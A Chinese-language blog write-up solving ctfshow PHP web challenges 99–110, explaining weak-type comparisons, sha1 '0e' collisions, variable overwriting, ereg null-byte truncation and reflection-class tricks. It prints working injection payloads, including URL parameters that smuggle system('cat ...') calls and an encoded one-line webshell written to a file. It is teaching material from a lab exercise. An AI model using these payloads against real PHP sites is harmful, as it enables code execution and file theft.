+<p>其实 GET 随便一个值都可以, 只要保证 POST 的内容是 <code>HTTP_FLAG=flag</code> 即可</p>
+<h2 id="web99">web99</h2>
+<p><img src="https://img.exp10it.io/img/202208101436589.png" alt=""></p>
+<p>本地测试了一下发现当 <code>n=123</code> 时概率最大, 可以通过 if</p>
+<p>但是我们需要以 n 为文件名写文件, n 的值必须是字符串</p>
+<p>这里考察的是 <code>in_array()</code> 的漏洞 (其实还是弱类型转换)</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">var_dump</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">in_array</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">1abc</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB"> [</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">1</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">2</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">3</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">4</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">5</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">; </span><span style="--shiki-light:#C2C3C5;--shiki-light-font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">// true</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">var_dump</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">in_array</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">abc</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB"> [</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">1</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">2</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">3</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">4</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">5</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">; </span><span style="--shiki-light:#C2C3C5;--shiki-light-font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">// false</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">var_dump</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">in_array</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">abc</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB"> [</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">0</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">1</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">2</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">3</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">4</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">5</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">; </span><span style="--shiki-light:#C2C3C5;--shiki-light-font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">// true</span></span></code></pre>
+<p><code>in_array()</code> 会将待搜索的值的类型自动转换为数组中的值的类型 (string to int)</p>
+<p>所以我们构造 <code>n=123.php</code> 并不影响 <code>in_array()</code> 的查找</p>
+<p><img src="https://img.exp10it.io/img/202208101447820.png" alt=""></p>
+<p>访问得到 flag</p>
+<p><img src="https://img.exp10it.io/img/202208101447468.png" alt=""></p>
+<p>该漏洞的修复方式如下</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">in_array</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">$_GET</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">n</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#6F42C1;--shiki-dark:#BEC5D4">allow</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#1976D2;--shiki-dark:#82AAFF"> true</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202208101450349.png" alt=""></p>
+<h2 id="web100">web100</h2>
+<p><img src="https://img.exp10it.io/img/202208101451950.png" alt=""></p>
+<p>不太懂, 搜了一下发现考察的是运算符的优先级</p>
+<p><a href="https://www.php.net/manual/zh/language.operators.precedence.php">https://www.php.net/manual/zh/language.operators.precedence.php</a></p>
+<p>查阅文档可以知道 <code>=</code> 的优先级是比 <code>and</code> 要高的</p>
+<p>也就是说 <code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code> 实际上是先执行了 <code>$v0=is_numeric($v1)</code>, 然后返回 true 或者 false, 之后执行 <code>true and is_numeric($v2) and is_numeric($v3);</code> 或者是 <code>false and is_numeric($v2) and is_numeric($v3);</code> (感觉没啥意义, 因为这个表达式的结果没有赋值)</p>
+<p>使用 <code>var_dump()</code> 导出 ctfshow 这个类, 注意 v2 不能含有 <code>;</code></p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://cc9adbd1-0cdb-4ae4-bcac-80750548dc2c.challenge.ctf.show/?v1=123&#x26;v2=var_dump($ctfshow)/*&#x26;v3=*/;</span></span></code></pre>
+<p>不写注释也行, 报错之后依然输出了 flag 值</p>
+<p>然后替换 <code>0x2d</code> 为 <code>-</code></p>
+<h2 id="web101">web101</h2>
+<p><img src="https://img.exp10it.io/img/202208101515863.png" alt=""></p>
+<p>比上题增加了更多的过滤, 而且单引号和 <code>$</code> 都被过滤了</p>
+<p>ctfshow 关键词只能以字符串的形式出现, 刚好最近在学 Java 的反射, 想着 php 会不会也有…</p>
+<p><a href="https://www.php.net/manual/zh/class.reflectionclass.php">https://www.php.net/manual/zh/class.reflectionclass.php</a></p>
+<p>下划线过滤了, 不能用 <code>var_dump()</code> 之类的函数, 但是 ReflectionClass 存在 <code>__toString()</code> 的魔术方法, 可以尝试 echo 输出</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://38ac8284-df96-4128-b419-a89849950fa7.challenge.ctf.show/?v1=123&#x26;v2=echo new ReflectionClass&#x26;v3=;</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202208101525170.png" alt=""></p>
+<p>hint 提示 flag 末尾少一位, 需要手工 <code>0-f</code> 都试一下</p>
+<h2 id="web102">web102</h2>
+<p><img src="https://img.exp10it.io/img/202208101530607.png" alt=""></p>
+<p>回调函数</p>
+<p><img src="https://img.exp10it.io/img/202208101532765.png" alt=""></p>
+<p>这里的 <code>is_numeric()</code> 是识别科学计数法的, <code>0123e45678</code> 返回 true, 但只要包含了非 <code>e</code> 的其他字母则会返回 false</p>
+<p><code>$v2</code> 必须为数字, 第一时间就想到了 <code>hex2bin()</code>, 但是 <code>&#x3C;</code> hex 的结果是 <code>0x3c</code>, 含有非 <code>e</code> 字母</p>
+<p>然后又想到 php://filter, 写入的时候 base64 decode 一下或许可以?</p>
+<p>但问题是 base64 的部分字符串 hex 之后存在非 <code>e</code> 字母, 例如</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>jklmoz 6a6b6c6d6f7a</span></span>
+<span class="line"><span>JKLMOZ 4a4b4c4d4f5a</span></span>
+<span class="line"><span>/ 2f</span></span></code></pre>
+<p>那么我们需要找到一个合适的 payload , 使它经过 base64 + hex 之后的字符串仅包含 <code>[0-9]</code> 和 <code>e</code>, 才能够绕过 <code>is_numeric()</code> 的检测</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">&#x3C;?</span><span style="--shiki-light:#24292EFF;--shiki-dark:#82AAFF">php</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">echo</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478"> bin2hex</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">str_replace</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> ''</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478"> base64_encode</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">$_GET</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">1</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">)))</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">?></span></span></code></pre>
+<p>测试出来这个</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>5044383959474e6864434171594473 // &#x3C;?=`cat *`;</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202208101634569.png" alt=""></p>
+<p>hex 码前面记得补两个0 (substr)</p>
+<p>然后访问 a.php 得到 flag</p>
+<h2 id="web103">web103</h2>
+<p><img src="https://img.exp10it.io/img/202208101639404.png" alt=""></p>
+<p>加了句这个, payload 同上</p>
+<h2 id="web104">web104</h2>
+<p><img src="https://img.exp10it.io/img/202208101642334.png" alt=""></p>
+<p>sha1 0e 漏洞, 而且是 <code>==</code></p>
+<p>以下值在 sha1 加密后以 0e 开头</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>aaroZmOk</span></span>
+<span class="line"><span>aaK1STfY</span></span>
+<span class="line"><span>aaO8zKZF</span></span>
+<span class="line"><span>aa3OFF9m</span></span>
+<span class="line"><span>0e1290633704</span></span>
+<span class="line"><span>10932435112</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202208101646079.png" alt=""></p>
+<p>或者用数组绕过</p>
+<p>然后回过头看发现好像不太对???</p>
+<p>直接传 <code>v1=1</code> <code>v2=1</code> 也能得到 flag</p>
+<h2 id="web105">web105</h2>
+<p><img src="https://img.exp10it.io/img/202208101648022.png" alt=""></p>
+<p>很明显的变量覆盖</p>
+<p>首先我们 GET 不能传 <code>error=xx</code>, POST 不能传 <code>xxx=flag</code></p>
+<p>因为这里的 <code>$_POST['flag']</code> 无法进行覆盖, 如果我们想要绕过 <code>if(!($_POST['flag']==$flag))</code>, 就必须要已知 flag 的值, 或者是将 <code>$flag</code> 设置为空, 然后 post 传递 <code>flag=</code></p>
+<p>只能是第二种办法, 但是这会清空原来 <code>$flag</code> 里面的内容, 于是我们需要找到一个可以输出的变量来存储原来 <code>$flag</code> 的值</p>
+<p>这里我们用 <code>$suces</code> 来存储 flag</p>
+<p>GET 传递 <code>?suces=flag&#x26;flag</code>=,  同时 POST <code>flag=</code></p>
+<p>注意这里 GET 的变量覆盖是按照参数传递时从左到右的顺序进行的, 所以清空 <code>$flag</code> 的操作一定在后面</p>
+<p><img src="https://img.exp10it.io/img/202208101718980.png" alt=""></p>
+<p>当然 GET 不传 <code>flag=</code> 也行</p>
+<p><img src="https://img.exp10it.io/img/202208101716289.png" alt=""></p>
+<p>hint 的另一种方式</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>GET: ?suces=flag POST: error=suces</span></span></code></pre>
+<h2 id="web106">web106</h2>
+<p><img src="https://img.exp10it.io/img/202208101721782.png" alt=""></p>
+<p>这里还是 <code>==</code>, 数组绕过或者用 sha1 0e</p>
+<p><img src="https://img.exp10it.io/img/202208101723909.png" alt=""></p>
+<h2 id="web107">web107</h2>
+<p><img src="https://img.exp10it.io/img/202208101735458.png" alt=""></p>
+<p>还是变量覆盖</p>
+<p><img src="https://img.exp10it.io/img/202208101738859.png" alt=""></p>
+<p>另一种方法, 数组</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>GET: ?v3[]= POST: v1=</span></span></code></pre>
+<h2 id="web108">web108</h2>
+<p><img src="https://img.exp10it.io/img/202208101740263.png" alt=""></p>
+<p>0x36d 转换成十进制是 877</p>
+<p>首先参数 c 必须要以字母为开头和结尾, 然后反转再取整的结果要等于 877</p>
+<p>不过这里的 <code>ereg()</code> 存在截断漏洞, <code>%00</code> 后的字符串不解析</p>
+<p>构造 <code>aa%00778</code> 来绕过 <code>ereg()</code> 的检测</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://be29cb33-099a-45a3-ab65-e1e1ea722922.challenge.ctf.show/?c=aa%00778</span></span></code></pre>
+<h2 id="web109">web109</h2>
+<p><img src="https://img.exp10it.io/img/202208101751120.png" alt=""></p>
+<p>v1 v2 必须含有字母</p>
+<p>想到了 <code>hex2bin</code> <code>base64_encode</code> 这些函数, 但是前面有一个 <code>new</code></p>
+<p>搜了一下发现一个 stdClass, 没有任何字段和方法</p>
+<p>本地试了一下报错了, 发现需要 <code>__toString</code> 魔术方法才能正常 echo 不报错</p>
+<p>于是想到了之前有一题里用到了 php 的反射类 ReflectionClass (暂时只知道这个…)</p>
+<p>之后就是注意闭合括号, 注释掉 v2 后面的内容</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://a243c3c5-6214-47b5-a8d1-36644e087a29.challenge.ctf.show/?v1=ReflectionClass&#x26;v2='stdClass');system('cat fl36dg.txt');//</span></span></code></pre>
+<p>hint 的方法, 用的是 Exception 类</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?v1=Exception&#x26;v2=system('cat fl36dg.txt')</span></span>
+<span class="line"><span>?v1=Reflectionclass&#x26;v2=system('cat fl36dg.txt')</span></span></code></pre>
+<p>发现竟然不用闭合括号…</p>
+<h2 id="web110">web110</h2>
+<p><img src="https://img.exp10it.io/img/202208101805550.png" alt=""></p>
+<p>过滤的挺多的…</p>
+<p>hint 提示是 <code>FilesystemIterator</code> 类</p>
+<p>利用 <code>FilesystemIteraor</code> 的构造方法列目录</p>
+<p><a href="https://www.php.net/manual/zh/filesystemiterator.construct.php">https://www.php.net/manual/zh/filesystemiterator.construct.php</a></p>
+<p><code>getcwd()</code> 返回当前工作目录, 即 /var/ww/html</p>
+<p>类里面刚好有 <code>__toString</code> 可以 echo 输出</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://566fb044-3805-43c9-9359-d09e3c07ddde.challenge.ctf.show/?v1=FilesystemIterator&#x26;v2=getcwd</span></span></code></pre>
+<p>flag 在 txt 里面… (本来以为是要读 php 文件的)</p> </article> <hr class="my-8 border-dashed"> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/ctf/ctfshow/ctfshow-web-php-89-110-writeup.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> <ul class="mt-4 mb-8 sm:my-8"> <li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/ctf/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-2"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>CTF</span> </a> </li> </ul> <div id="btt-btn-container" class="fixed end-4 bottom-8 z-50 md:sticky md:end-auto md:float-end md:me-1 translate-y-14 opacity-0 transition duration-500"> <button data-button="back-to-top" class="group relative bg-background px-2 py-1 size-14 rounded-full shadow-xl md:h-8 md:w-fit md:rounded-md md:shadow-none md:focus-visible:rounded-none md:bg-background/35 md:bg-clip-padding md:backdrop-blur-lg"> <span id="progress-indicator" class="absolute inset-0 -z-10 block size-14 scale-110 rounded-full bg-transparent md:hidden md:h-8 md:rounded-md"></span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block rotate-90 md:hidden"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <span class="sr-only text-sm group-hover:text-accent md:not-sr-only"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 5l0 14" /><path d="M16 9l-4 -4" /><path d="M8 9l4 -4" /></svg>
+Back To Top
+</span> </button> </div> <script data-astro-rerun>
+  /** Scrolls the document to the top when
+   * the "Back to Top" button is clicked. */
+  function backToTop() {
+    const rootElement = document.documentElement;
+    const btnContainer = document.querySelector("#btt-btn-container");
+    const backToTopBtn = document.querySelector("[data-button='back-to-top']");
+    const progressIndicator = document.querySelector("#progress-indicator");
+
+    if (!rootElement || !btnContainer || !backToTopBtn || !progressIndicator)
+      return;
+
+    // Attach click event handler for back-to-top button
+    backToTopBtn.addEventListener("click", () => {
+      document.body.scrollTop = 0; // For Safari
+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    });
+
+    // Handle button visibility according to scroll position
+    let lastVisible = null;
+    function handleScroll() {
+      const scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
+      const scrollTop = rootElement.scrollTop;
+      const scrollPercent = Math.floor((scrollTop / scrollTotal) * 100);
+
+      progressIndicator.style.setProperty(
+        "background-image",
+        `conic-gradient(var(--accent), var(--accent) ${scrollPercent}%, transparent ${scrollPercent}%)`
+      );
+
+      const isVisible = scrollTop / scrollTotal > 0.3;
+
+      if (isVisible !== lastVisible) {
+        btnContainer.classList.toggle("opacity-100", isVisible);
+        btnContainer.classList.toggle("translate-y-0", isVisible);
+        btnContainer.classList.toggle("opacity-0", !isVisible);
+        btnContainer.classList.toggle("translate-y-14", !isVisible);
+        lastVisible = isVisible;
+      }
+    }
+
+    let ticking = false;
+    document.addEventListener("scroll", () => {
+      if (!ticking) {
+        window.requestAnimationFrame(() => {
+          handleScroll();
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  }
+  backToTop();
+</script> <div class="flex flex-none flex-col items-center justify-center gap-1 md:items-start"><span class="italic">Share this post on:</span><div class="text-center"><a href="https://wa.me/?text=https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via WhatsApp"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg><span class="sr-only">Share this post via WhatsApp</span></a><a href="https://www.facebook.com/sharer.php?u=https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Facebook"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3" /></svg><span class="sr-only">Share this post on Facebook</span></a><a href="https://x.com/intent/post?url=https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on X"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg><span class="sr-only">Share this post on X</span></a><a href="https://t.me/share/url?url=https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via Telegram"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg><span class="sr-only">Share this post via Telegram</span></a><a href="https://pinterest.com/pin/create/button/?url=https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Pinterest"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 20l4 -9" /><path d="M10.7 14c.437 1.263 1.43 2 2.55 2c2.071 0 3.75 -1.554 3.75 -4a5 5 0 1 0 -9.7 1.7" /><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /></svg><span class="sr-only">Share this post on Pinterest</span></a><a href="mailto:?subject=See%20this%20post&#38;body=https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via email"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg><span class="sr-only">Share this post via email</span></a></div></div> <hr class="my-6 border-dashed"> <!-- Previous/Next Post Buttons --> <div data-pagefind-ignore class="grid grid-cols-1 gap-6 